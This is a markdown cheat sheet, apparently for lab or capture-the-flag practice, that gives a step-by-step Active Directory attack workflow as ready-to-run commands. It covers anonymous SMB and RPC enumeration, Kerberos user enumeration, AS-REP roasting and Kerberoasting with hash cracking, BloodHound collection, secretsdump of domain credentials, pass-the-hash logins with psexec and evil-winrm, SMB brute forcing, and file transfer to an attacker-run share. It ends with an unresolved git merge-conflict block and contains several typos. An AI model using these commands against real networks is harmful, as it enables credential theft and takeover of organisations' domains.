## Active Directory 
### Machine workflow
- [Tools](#too)
- [Enumerate Ports and Shares](#enum)
- [Identify valid users](#user)
- [Obtain users has who have kerberos pre auth set](#gnp)
- [Crack the hash to obtain the password](#cra)
- [Repeat Recon](#rrpc)
- [Enumerate other users in the network](#enumu)
- [Remote login if hash is obtained](#pwn)

### Required Tools <a name='too'></a>
- [Impackets](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Windsearch](https://github.com/ropnop/go-windapsearch)
- [EvilWinRM](https://github.com/Hackplayers/evil-winrm)
- [BloodHound.py](https://github.com/fox-it/BloodHound.py)

### Enumeration Ports <a name="enum"></a>
```bash
# nmap 
nmap -p- --min-rate=1000 -oN ports -vv <machine-ip>
# sorting ports
open=$(cat ports | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//))
# enumerate services
nmap -sC -sV -p$open -oN nmap.out -T4 -vv <machine-ip>
```

### Anonymous Access
```bash
# crackmapexec
crackmapexec smb <machine-ip> -u'' -p'' <machine-ip> --shares

# smbclient
smbclinet -N -L \\<machine-ip>\\

#rpcclinet
rpcclient -U '' -P'' <machine-ip> # logs into the network if anon login is permitted
rpcclinet $> enumdomusers # enumerates the AD users
```

### Accessing a SMB Share
```bash
# smbclient
smbclient \\\\<machine-ip>\\<share-name>
```

### User Enumeration <a name='user'></a>

- kerbrute

```bash
# no authentication is required, just the user name list
# enumerate AD users with kerbrute
kerbrute userenum --dc 10.10.*.* -d <domain-name> <username(s)>
```

### Mounting an open share

```bash
# mount an anonymous login share
sudo mount -t cifs '//10.10.*.*/ShareName' /<mount-location>
```

### Kerberos Hacking <a name="gnp"></a>
```bash
# after obtaining valid users, look for users with kerberos preauth set
GetNPUsers.py -dc-ip <machine-ip> -format hashcat -usersfile <username(s)> <domain-name>/ -outputfile <hash-output>
```

### Obtaining Password <a name="cra"></a>
```bash
# cracking with hashcat
# TGT hash crack
hashcat -m 18200 -w /usr/share/wordlists/rockyou.txt <hash-file>
# SPN hash crack
hashcat -m 13100 -w /usr/share/wordlists/rockyou.txt <hash-file>

# cracking with JOHN THE RIPPER
# TGT hash crack
john --format=krb5tgs -w=/usr/share/wordlists/rockyou.txt <hash-file>
```

### Recon as a user in network <a name='rrpc'></a>
```bash
# since we have the user credentials for a user in the AD network, recon again to obtain files with specific permissions

# enumerate smb shares
crackmapexec smb <machine-ip> -u '<username>' -p '<password>'  --shares

# accessing smb share
smbclient -L \\\\<machine-ip>\\<share-name> -U <username> <password>

# mounting the share
sudo mount -t cifs -o 'username=UserName,password=Password' '//10.10.*.*/ShareName' /<mount-location>

# enumerate anything ¯\_(ツ)_/¯ with windsearch 
windsearch -d <domain-name> -u <user-name> -p <password> -m <module>
```

### Enumerate other users <a name="enumu"></a>
```bash
# a valid login into the network is required
# getadusers.py from impackets
GetADUsers.py --all -dc-ip <machine-ip> <domain-name>/<username>:<password> # TGT will be obtained which can be cracked offline

# enumerate service name principles
GetUserSPNs.py -request -dc-ip <machine-ip> <domain-name>/<username>:<password> # SPN hash will be obtained which can be cracked offline

# via rpcclient
rpcclient -U <username> -P <password> <machine-ip> #logged into the network
rpcclinet $> enumdomusers # enumerate users in the active directory environment

# crackmapexec
crackmapexec smb <machine-ip> -u <username> -p <password> --users

# windsearch 
windsearch -d <domain-name> -u <user-name> -p <password> -m users
```

### Bloodhound Enumeration <a name='bh'></a>
```bash
# setup
git clone https://github.com/fox-it/BloodHound.py; cd BloodHound.py; python3 setup.py install

# Running bloodhound.py (run on linux)
python3 bloodhound.py -u <username> -p <password> -ns <machine-ip> -d <domain> -c all 
```
```powershell
# with sharpsploit
powershell -ep bypass
import-module .\SharpHound.ps1
invoke-bloodhound -collectionmethod all -domain <domain-name> -ldapuser <user-name> -ldappass <password>
```

```bash
# start the neo4j console
sudo ne04j console

# start the bloodhound
cd /opt/bloodhound-linux-x64/
./BloodHound

# import all the json files
# mark the obtained user as owned user and the target user as high value target
```

### Owning the machine <a name='pwn'></a>
```bash
# perform bloodhound enumeration
# if the access to the backup account is obtained,
secretsdump.py -dc-ip <machine-ip> -just-dc <domain-name>/backup:<password>@<domain-name>

# login to the machine

# psexec.py
# with password
psexec.py <domain-name>/<username>:<password>@<domain-namee>
# with ntlm hash
psexec.py -hashes <ntml:hashes> <username>@<domain-name> -target-ip <machine-ip> -dc-ip <machine-ip>
psexec.py -hashes <ntlm:hashes> <username>@<machine-ip>


# evilwinrm
# with password
evilwinrm -i <machine-ip> -u <username> -p <password>
# with ntlm hash
evilwinrm -i <machine-ip> -H <ntlm hash from secretsdump> -u <username>
```

### Misc

#### Bruteforce
##### Hydra
```bash
# bruteforcing smb login
hydra -L users.txt -P pass.txt 10.10.*.* smb
```
##### Crackmapexec
```bash
# bruteforcing smb login, enumerating the available shares with --shares option
crackmapexec smb 10.10.*.* -u user.txt -p pass.txt --shares --continue-on-success

# bruteforcing winrm login
crackmapexec winrm 10.10.*.* -u users.txt -p pass.txt --continue-on-success 
```
##### Medusa
```bash
# bruteforcing smb login
medusa -h 10.10.*.* -U users.txt -P pass.txt -M smbnt 
```

#### File Transfer
##### SMB Service
```bash
# start a smb service in linux
# anonymous share
smbserver.py <share-name> . -smb2support
# authenticated share
smbserver.py <share-name> . -smb2support -username <username> -password <password>

# connect to the smbshare in windows
# anonymous share
net use x: \\<linux-ip>\<share-name>
# authenticated share
net use x: \\<linux-ip>\<share-name> /u:<username> <password>

# Copy file from windows to linux
copy <file-in-windows> \\<linux-ip>\<share-name>\
# copy files from linux to windows
copy \\<linux-ip>\<share-name>\<file.ext> .

```

<<<<<<< HEAD
##### Useful Links
- https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
- https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/
- https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
=======
##### useful links
- https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
- https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/
- https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
>>>>>>> dea41aa2b59fa497c70e9445f4c39b70a290ee5c
